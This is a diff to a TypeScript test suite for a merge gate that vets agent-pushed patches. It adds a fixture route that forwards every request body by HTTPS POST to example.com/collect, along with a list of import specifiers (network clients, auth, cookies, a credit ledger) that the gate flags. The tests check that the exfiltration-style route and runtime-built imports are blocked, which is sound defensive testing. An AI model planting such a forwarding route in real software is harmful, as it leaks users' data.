@@ -5,7 +5,7 @@ import { RESERVED_DECISION_CONSTANTS, classifyPath, compileManifestPattern } fro
 import { isPolicyTestName } from "../lib/agentPushPolicy.ts";
 import {
   AMUX_DM_T2_MERGE_CONTENT_ALARMS, amuxDmT2MergeChangeVerdict, amuxDmT2MergeContentAlarmPaths, amuxDmT2MergeGate,
-  amuxDmT2MergePatchGate, amuxDmT2MergeReadyVerdict,
+  amuxDmT2MergeImportAlarms, amuxDmT2MergePatchGate, amuxDmT2MergeReadyVerdict,
 } from "../lib/amux/dmT2MergeCore.ts";
 import {
   QA_RELEASE_DM_MERGE_ALLOW_EXCEPT_PATTERNS, QA_RELEASE_DM_MERGE_ALLOW_PATTERNS, QA_RELEASE_DM_MERGE_BLOCKLIST_SCOPE_PATTERNS,
@@ -328,6 +328,23 @@ test("the app's fresh read holds only while the approved patch still passes, and
   assert.deepEqual(amuxDmT2MergeChangeVerdict({ approved, change: change({ changedFiles: [route] }), scope: BLOCK,
     patch: patchOf(route, "export {};", exfil), files: new Map([[route, exfil]]) }),
     { holds: false, reason: "outside_dm_merge_allowlist", paths: [route] });
+  // Review r-20261115-120924-b09623: what a file imports, not only what it says.
+  const nodeHttps = 'import { request } from "node:https";\nexport async function POST(req: Request) {\n  const out = request({ hostname: "example.com", path: "/collect", method: "POST" });\n  out.end(await req.text());\n  return Response.json({ ok: true });\n}\n';
+  assert.deepEqual(amuxDmT2MergeChangeVerdict({ approved, change: change({ changedFiles: [route] }), scope: BLOCK,
+    patch: patchOf(route, "export {};", "export {};"), files: new Map([[route, nodeHttps]]) }),
+    { holds: false, reason: "outside_dm_merge_allowlist", paths: [route] });
+  assert.deepEqual(amuxDmT2MergeImportAlarms(route, nodeHttps), ["node:https"]);
+  for (const [text, alarms] of [
+    ['import { request } from "https";', ["https"]], ['import ky from "ky";', ["ky"]], ['import OpenAI from "openai";', ["openai"]],
+    ['import { cookies } from "next/headers";', ["next/headers"]], ['const m = require("./x");', []],
+    ['import { auth } from "@/lib/auth";', ["@/lib/auth"]], ['import { readAmux } from "../amux/x";', ["../amux/x"]],
+    ['import { x } from "../conversationProduct";', ["../conversationProduct"]], ['import { y } from "../../../../x";', ["../../../../x"]],
+    ['export * from "@/lib/creditLedger";', ["@/lib/creditLedger"]], ['import "@/lib/agentPushPolicy";', ["@/lib/agentPushPolicy"]],
+    ['import { useState } from "react";\nimport Link from "next/link";\nimport { z } from "zod";', []],
+    ['import { MessageBubble } from "@/components/chat/MessageBubble";\nimport { limit } from "./webSearchCitations";', []],
+  ]) assert.deepEqual(amuxDmT2MergeImportAlarms("lib/conversationSearch.ts", text), alarms, text);
+  // A specifier assembled at run time is an alarm of its own.
+  assert.equal(amuxDmT2MergePatchGate(patchOf("lib/conversationSearch.ts", "a", "await import(`./${name}`)"), BLOCK).pass, false);
   // A file not read, gone at the head, or no files at all: a person's.
   assert.deepEqual(verdict({ files: undefined }), { holds: false, reason: "paths_unreadable",
     paths: ["lib/conversationSearch.ts", "app/api/conversations/search/route.ts"] });
